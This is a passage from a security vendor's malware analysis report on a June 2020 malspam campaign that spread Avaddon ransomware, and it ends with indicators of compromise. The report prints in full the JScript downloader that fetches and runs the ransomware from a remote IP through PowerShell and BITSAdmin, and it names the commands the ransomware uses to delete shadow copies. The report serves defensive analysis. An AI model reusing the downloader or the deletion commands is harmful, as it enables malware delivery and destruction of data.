Just two days later on\n2020-06-05 malspam distributing the Avaddon ransomware has been observed.\n\nThis article briefly outlines the first wave of malspam distributing Avaddon ransomware as observed by\nHornetsecurity’s Security Lab.\n\n## Background\n\nThe initial email of the Avaddon ransomware uses a pretend image lure:\n\n\n-----\n\nThe attached ZIP archive contains a JSript file that upon execution will download and execute the Avaddon\nransomware binary:\n\n## Technical Analysis\n\nIn the following we will analyze the malicous email, the JScript downloader, and last but not least the\ndownloaded Avaddon ransomware binary.\n\n### Emails\n\nEmails are send from `<name>[0-9]{2}@[0-9]{4}.com sender email addresses. Most of the four number`\ndot com domains ( [0-9]{4}.com ) are parked domains without any SPF records, hence, blocking on\npolicy grounds is not possible.\n\nThe malspam distributing Avaddon ransomware started on 2020-06-04 at around 14:00:00 UTC and are\nstill lasting while writing this report:\n\n\n-----\n\nThe observed wave seems to target CA (Canada):\n\n\n-----\n\nThe recipient industries seem to indicate a focus on education institutions at the receiving end of this wave:\n\n\n-----\n\nHowever, because this is only data from the first wave this should not be interpreted as the final\n**targeting of the Avaddon ransomware.**\n\n### JScript Downloader\n\nThe `IMG000000.jpg.js.zip attachment contains the` `IMG000000.jpg.js JScript downloader:`\n\n\n-----\n\nThe Avaddon downloader script is simply:\n```\nvar jsRun=new ActiveXObject('WSCRIPT.Shell');\njsRun.Run(\"cmd.exe /c PowerShell -ExecutionPolicy Bypass (New-Object\nSystem.Net.WebClient).DownloadFile('hxxp[:]//217.8.117[.]63/sava[.]exe','%temp%\\\\5203508738.exe');St\nProcess '%temp%\\\\5203508738.exe'\",false);\njsRun.Run(\"cmd.exe /c bitsadmin /transfer getitman /download /priority high\nhxxp[:]//217.8.117[.]63/sava[.]exe %temp%\\\\237502353.exe&start %temp%\\\\237502353.exe\", false);\n\n```\nIt uses both PowerShell and the BITSAdmin tool to download the `sava.exe Avaddon ransomware file to`\n```\n%temp%\\\\5203508738.exe and %temp%\\\\237502353.exe respectively and execute it:\n\n### Avaddon Ransomware sava.exe\n\n```\nThe Avaddon ransomware executable is not packed. However, its strings appear Base64 encoded using a\ncustom alphabet. Imports are freely accessible. The Avaddon ransomware uses the Windows crypto API to\ngenerate an AES key, with which it then (presumably) encrypts the data. The generated AES key is then\nexported and encrypted via a previously from the ransomware binary imported key:\n\nFurther the Avaddon ransomware deletes the volume shadow copies via `wmic.exe SHADOWCOPY`\n```\n/nointeractive and vssadmin.exe Delete Shadows /All /Quiet .\n\n```\nAfter encryption the Avaddon ransomware changes the desktop background notifying the victim that files\nhave been encrypted and where the instructions to pay the ransom are located:\n\n\n-----\n\nThe Avaddon ransomware leaves a file named `[0-9]+-readme.html in every directory it encrypts. This`\nfile contains the instructions and an .onion link to the ransomware panel:\n\n\n-----\n\nVictims are expected to copy their ransom ID to the linked .onion Tor hidden service website then received\nfurther instructions on how to pay the ransom and receive a decrypter.\n\n## Conclusion and Remediation\n\nAs can be seen from this example malware underground collaboration can speed up the proliferation and\ndistribution of new ransomware.\n\nHornetsecurity’s [Spamfilter and Malware Protection with the highest detection rates on the market already](https://www.hornetsecurity.com/en/services/spam-filter/)\ndetects and blocks the outlined threat. Hornetsecurity’s [Advanced Threat Protection extends this protection](https://www.hornetsecurity.com/en/services/advanced-threat-protection/)\nby also detecting yet unknown threats.\n\n\n-----\n\n## References\n\n[1] [https://twitter.com/Bank_Security/status/1268163582518276103](https://twitter.com/Bank_Security/status/1268163582518276103)\n\n## Indicators of Compromise (IOCs)\n\n### Hashes\n\n**SHA256** **Filename** **Description**\n\n`05af0cf40590aef24b28fa04c6b4998b7ab3b7f26e60c507adb84f3d837778f2` `sava.exe` Avaddon\nransomware\n\n### URLs\n\n```\nhxxp[:]//217.8.117[.]63/sava[.]exe\n\n```\n\n-----",
